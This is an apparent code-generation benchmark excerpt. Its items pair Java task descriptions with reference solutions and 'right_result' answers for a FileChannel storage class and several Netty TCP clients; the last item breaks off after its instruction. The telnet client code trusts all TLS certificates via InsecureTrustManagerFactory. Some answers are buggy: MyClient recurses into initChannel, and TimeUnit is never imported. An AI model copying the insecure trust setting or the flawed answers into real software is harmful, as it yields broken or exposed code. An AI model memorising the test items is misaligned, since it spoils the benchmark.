    "Instruction": "Task Description: Implement a thread-safe file storage class that provides efficient read/write operations using Java NIO's FileChannel with proper resource management and concurrency control.\n\nClass Description: CachedOpenFile is a storage implementation that manages file operations using FileChannel, providing thread-safe access through read-write locks. It supports reading and writing data blocks at specific offsets, capacity management, and ensures proper file handling.\n\nAttributes:\n- fc: FileChannel - The file channel used for all file operations\n- lock: ReadWriteLock - Provides thread-safe access control for file operations\n- capacity: long - The maximum capacity of the storage unit\n\nMethods:\n- Constructor: CachedOpenFile(Path file, long capacity) -> void - Initializes the file channel with given path and capacity, creating parent directories if needed\n- readBlock: readBlock(ByteBuffer buffer, long offset) -> int - Reads data from the specified offset into the buffer\n- writeBlock: writeBlock(ByteBuffer buffer, long offset) -> int - Writes data from the buffer to the specified offset\n- writeBlock: writeBlock(ByteBufferView buffer, long offset) -> int - Writes data from a ByteBufferView to the specified offset\n- capacity: capacity() -> long - Returns the maximum capacity of the storage\n- size: size() -> long - Returns the current size of the file\n- flush: flush() -> void - Forces any changes to be written to disk\n- lockForIoOperation: lockForIoOperation() -> void - Acquires a read lock for IO operations\n- unlockForIoOperation: unlockForIoOperation() -> void - Releases the read lock after IO operations\n- close: close() -> void - Closes the file channel and releases all resources\n- ensureOpen: ensureOpen() -> void - Private method to verify the file channel is open before operations",
    "Canonical_solution": "import bt.data.StorageUnit;\nimport bt.net.buffer.ByteBufferView;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\nclass CachedOpenFile implements StorageUnit {\n    private final FileChannel fc;\n    private final ReadWriteLock lock = new ReentrantReadWriteLock();\n    private final long capacity;\n\n    CachedOpenFile(Path file, long capacity) {\n        try {\n            Path parent = file.getParent();\n            if (parent != null) {\n                Files.createDirectories(parent);\n            }\n            fc = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        } catch (IOException ex) {\n            throw new UncheckedIOException(\"Could not open file \" + file.toAbsolutePath(), ex);\n        }\n        this.capacity = capacity;\n    }\n\n    @Override\n    public int readBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to read past the end of file (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.read(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to read bytes (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.write(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBufferView buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return buffer.transferTo(fc, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public long capacity() {\n        return capacity;\n    }\n\n    @Override\n    public long size() {\n        ensureOpen();\n        try {\n            return fc.size();\n        } catch (IOException ex) {\n            throw new UncheckedIOException(ex);\n        }\n    }\n\n    public void flush() throws IOException {\n        if (fc.isOpen())\n            this.fc.force(false);\n    }\n\n    public void lockForIoOperation() {\n        this.lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        this.lock.readLock().unlock();\n    }\n\n    @Override\n    public void close() throws IOException {\n        lock.writeLock().lock();\n        try {\n            this.fc.close();\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    private void ensureOpen() {\n        if (!fc.isOpen()) {\n            throw new IllegalStateException(\"Cannot access a closed file.\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\npublic class CachedOpenFile {\n    private final FileChannel fc;\n    private final ReadWriteLock lock = new ReentrantReadWriteLock();\n    private final long capacity;\n\n    public CachedOpenFile(Path file, long capacity) throws IOException {\n        this.capacity = capacity;\n        this.fc = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        if (!file.toFile().exists()) {\n            fc.truncate(0).force(true);\n        }\n    }\n\n    public int readBlock(ByteBuffer buffer, long offset) throws IOException {\n        ensureOpen();\n        lockForIoOperation();\n        try {\n            return fc.read(buffer, offset);\n        } finally {\n            unlockForIoOperation();\n        }\n    }\n\n    public int writeBlock(ByteBuffer buffer, long offset) throws IOException {\n        ensureOpen();\n        lockForIoOperation();\n        try {\n            return fc.write(buffer, offset);\n        } finally {\n            unlockForIoOperation();\n        }\n    }\n\n    public int writeBlock(ByteBufferView buffer, long offset) throws IOException {\n        return writeBlock(buffer.asByteBuffer(), offset);\n    }\n\n    public long capacity() {\n        return capacity;\n    }\n\n    public long size() throws IOException {\n        ensureOpen();\n        return fc.size();\n    }\n\n    public void flush() throws IOException {\n        ensureOpen();\n        fc.force(true);\n    }\n\n    private void lockForIoOperation() {\n        lock.readLock().lock();\n    }\n\n    private void unlockForIoOperation() {\n        lock.readLock().unlock();\n    }\n\n    public void close() throws IOException {\n        if (fc.isOpen()) {\n            fc.close();\n        }\n    }\n\n    private void ensureOpen() throws IOException {\n        if (!fc.isOpen()) {\n            throw new IOException(\"FileChannel is closed\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 150,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server and handle echo messages.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified host and port, and handles incoming and outgoing messages through a custom handler. It manages network resources and ensures proper cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- EchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Initializes and starts the Netty client, establishes connection to the remote server, and manages the connection lifecycle. Throws Exception if any error occurs during the process",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, port))\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new EchoClientHandler());\n                    }\n                });\n            ChannelFuture f = b.connect().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your custom handler here\n                     p.addLast(new EchoClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + EchoClient.class.getSimpleName() + \" <host> <port>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n\n        new EchoClient(host, port).start();\n    }\n}\n```"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, handle incoming data, and manage connection lifecycle.\n\nClass Description: The TimeClient class establishes and manages a non-blocking TCP connection to a specified server using Netty's NIO framework. It handles connection setup, message processing through a custom pipeline, and graceful shutdown of resources.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\nworkerGroup: EventLoopGroup - Netty's event loop group for handling I/O operations\nbootstrap: Bootstrap - Netty's client bootstrap for configuring and starting the client\n\nMethods:\nTimeClient(String host, int port) -> None - Constructor that initializes the client with target server details and creates necessary Netty components\nstart() -> void - Configures and starts the Netty client, establishes connection to server, and waits for connection closure\nstop() -> void - Shuts down the client gracefully by releasing all resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(workerGroup)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new TimeDecoder());\n                            ch.pipeline().addLast(new TimeClientHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n    private final String host;\n    private final int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap()\n                .group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new TimeDecoder(), new TimeClientHandler());\n                    }\n                });\n    }\n\n    public void start() throws InterruptedException {\n        ChannelFuture f = bootstrap.connect(host, port).sync();\n        f.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + TimeClient.class.getSimpleName() + \"<hostname> <port>\");\n            return;\n        }\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n        new TimeClient(host, port).start();\n    }\n}\n```"
  },
  {
    "Task_id": 152,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: MyClient is a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly. The client uses custom encoders/decoders and handlers for message processing.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nconstructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\nrun: run() -> void - Main method that establishes the connection, sends periodic messages, and manages resources. Throws InterruptedException for thread-related operations\ninitChannel: initChannel(SocketChannel ch) -> void - Configures the channel pipeline with custom encoders, decoders, and handlers (internal method within ChannelInitializer)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                    ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class MyClient {\n    private final String host;\n    private final int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     initChannel(ch);\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    protected void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline p = ch.pipeline();\n        p.addLast(new LengthFieldPrepender(4));\n        p.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4));\n        p.addLast(new StringDecoder());\n        p.addLast(new StringEncoder());\n        p.addLast(new ClientHandler());\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.err.println(\"Usage: \" + MyClient.class.getSimpleName() + \" <hostname> <port>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n\n        new MyClient(host, port).run();\n    }\n}\n\nclass ClientHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        // Handle incoming messages here\n        System.out.println(\"Received: \" + msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) throws Exception {\n        super.channelActive(ctx);\n        // Send periodic messages here\n        ctx.executor().scheduleAtFixedRate(() -> {\n            ctx.writeAndFlush(\"\u4f60\u597d\uff0c\u4e16\u754c\uff01\\n\");\n        }, 0, 5, TimeUnit.SECONDS);\n    }\n}\n```"
  },
  {
    "Task_id": 153,
    "Instruction": "Task Description: Create a TCP client using Java Netty framework that can establish a secure/non-secure connection to a remote server, send messages from standard input, and gracefully handle connection termination.\n\nClass Description: TelnetClient is a Netty-based TCP client that connects to a specified host and port, supports SSL/TLS encryption when configured, and provides interactive message sending capability through standard input.\n\nAttributes:\nSSL: static final boolean - Flag indicating whether SSL/TLS encryption should be used\nHOST: static final String - The host address to connect to (default: \"127.0.0.1\")\nPORT: static final int - The port number to connect to (default: 8992 for SSL, 8023 for non-SSL)\n\nMethods:\nstart: void() throws Exception - Main method that initializes the Netty client, establishes connection, handles user input, and manages connection lifecycle\n  - Initializes SSL context if SSL is enabled\n  - Creates and configures Netty Bootstrap with NioEventLoopGroup\n  - Establishes connection to specified host and port\n  - Reads input from console and sends to server\n  - Handles graceful shutdown on \"bye\" command or connection close",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class TelnetClient {\n    private static final boolean SSL = false;\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = SSL ? 8992 : 8023;\n\n    public static void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            SslContext sslCtx = null;\n            if (SSL) {\n                sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                        .build();\n            }\n\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline p = ch.pipeline();\n                            if (sslCtx != null) {\n                                p.addLast(sslCtx.newHandler(ch.alloc()));\n                            }\n                            p.addLast(new StringDecoder());\n                            p.addLast(new StringEncoder());\n                            p.addLast(new TelnetClientHandler());\n                        }\n                    });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        start();\n    }\n}\n\nclass TelnetClientHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.out.println(msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) throws Exception {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n        System.out.println(\"Disconnected from server\");\n    }\n}\n```"
  },
  {
    "Task_id": 154,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, send messages from standard input, and handle file operations.\n\nClass Description: The FileClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It configures the client pipeline with string encoders/decoders and a custom handler for file operations. The client continuously reads input from the console and sends it to the server.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\ndest: String - The destination path for file operations (used by the client handler)\n\nMethods:\nrun(): void - throws InterruptedException, IOException - Main method that initializes the Netty client, establishes connection, and handles message sending\n  - Input: None\n  - Output: None (but may throw InterruptedException or IOException)\n  \nFileClient(String, int, String) - Constructor that initializes the client with connection parameters\n  - Input:\n    - host: String - Server hostname/IP\n    - port: int - Server port\n    - dest: String - File destination path\n  - Output: FileClient instance (constructor)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class FileClient {\n\n    private String host;\n    private int port;\n    private String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"encoder\", new StringEncoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(\"decoder\", new StringDecoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(new FileClientHandler(dest));\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            Channel channel = f.channel();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class FileClient {\n    private final String host;\n    private final int port;\n    private final String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new FileClientHandler(dest));\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                String line = reader.readLine();\n                if (\"exit\".equalsIgnoreCase(line)) break;\n                f.channel().writeAndFlush(line);\n            }\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 3) {\n            System.err.println(\"Usage: \" + FileClient.class.getSimpleName() + \" <host> <port> <dest>\");\n            return;\n        }\n        new FileClient(args[0], Integer.parseInt(args[1]), args[2]).run();\n    }\n}\n```"
  },
  {
    "Task_id": 155,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a Docker daemon, with support for SSL/TLS encryption and timeout handling.\n\nClass Description: The NettyTcpClient class provides functionality to establish and manage TCP connections to a Docker daemon using Netty framework. It handles connection initialization, SSL/TLS configuration, timeout management, and graceful shutdown.\n\nAttributes:\n- bootstrap: Bootstrap - Netty's client bootstrap for connection configuration\n- eventLoopGroup: EventLoopGroup - Manages client-side I/O threads\n- connectTimeout: Integer - Connection timeout in milliseconds\n- readTimeout: Integer - Read operation timeout in milliseconds\n- threadPrefix: String - Prefix for Netty thread names\n\nMethods:\n- init(DockerClientConfig dockerClientConfig) -> void - Initializes the Netty client with Docker configuration\n- connect(DockerClientConfig dockerClientConfig) -> DuplexChannel - Establishes connection to Docker daemon with SSL support\n- initSsl(DockerClientConfig dockerClientConfig) -> SslHandler - Configures SSL/TLS for the connection\n- enableHostNameVerification(SSLParameters sslParameters) -> SSLParameters - Enables hostname verification in SSL parameters\n- close() -> void - Shuts down the client gracefully\n- configure(T channel) -> T - Configures channel timeouts and handlers\n- ReadTimeoutHandler() -> void - Inner class handling read timeout events",
